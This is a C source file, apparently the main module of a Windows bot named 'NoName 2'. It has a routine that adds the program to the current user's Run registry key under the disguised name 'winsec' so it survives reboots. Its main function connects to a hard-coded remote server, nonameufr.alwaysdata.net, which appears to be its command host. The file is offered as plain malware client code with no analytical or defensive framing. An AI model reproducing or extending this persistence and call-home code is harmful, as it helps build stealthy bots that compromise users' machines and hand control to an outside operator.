#include "utils.h"
#include "nn_bot.h"
#include "version.h"

int runevery();

#ifndef NN_LOG
#define NN_LOG 0
#endif // NN_LOG
#ifndef NN_ERRLOG
#define NN_ERRLOG 0
#endif // NN_LOG
#ifndef NN_RUNEVERY
#define NN_RUNEVERY 0
#endif // NN_LOG

int LOG = NN_LOG;
int ERRLOG = NN_ERRLOG;
int RUNEVERY = NN_RUNEVERY;

FILE *log_file;
FILE *errlog_file;

int main(int argc, char *argv[])
{
    start_log();

    if(RUNEVERY)
    {
        runevery();
    }

    printf("********************************\n");
    printf("*******                 ********\n");
    printf("******   NoName 2_v%d.%d   *******\n", VERSION_MAJOR, VERSION_MINOR);
    printf("*******                 ********\n");
    printf("********************************\n");

    char host[256];
    strcpy(host, "nonameufr.alwaysdata.net:443");

    bot_startup(host, 2000);
    bot_cleanup(host);

    return 0;
}

void start_log()
{
    if(LOG)
    {
        log_file = freopen("log\\winsec.log", "a", stdout);
        if(log_file == NULL)
        {
            fprintf(stderr, "failed to open log file");
            LOG = 0;
        }
    }
    if(ERRLOG)
    {
        errlog_file = freopen("log\\error.log", "a", stderr);
        if(errlog_file == NULL)
        {
            fprintf(stderr, "failed to open error log file");
            ERRLOG = 0;
        }
    }
}

void close_log()
{
    if(LOG)
    {
        fclose(log_file);
    }
    if(ERRLOG)
    {
        fclose(errlog_file);
    }
}

int runevery()
{
    char val_name[128];
    char value[1024];

    char buffer[512];
    unsigned long res;

    res = GetModuleFileName(NULL, buffer, 512);
    if(res == 0)
    {
        fatalWS("while retrieving program's name ", GetLastError());
        return -1;
    }

    strcpy(val_name, "winsec");
    sprintf(value, "\"%s\"", buffer);

    unsigned long length = strlen(value);

    HKEY key;
    res = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &key);
    if(res != ERROR_SUCCESS)
    {
        fatalWS("while opening subkey ", res);
        return -1;
    }

    res = RegSetValueEx(key, val_name, 0, REG_SZ, (LPBYTE) value, length);

    return 0;
}
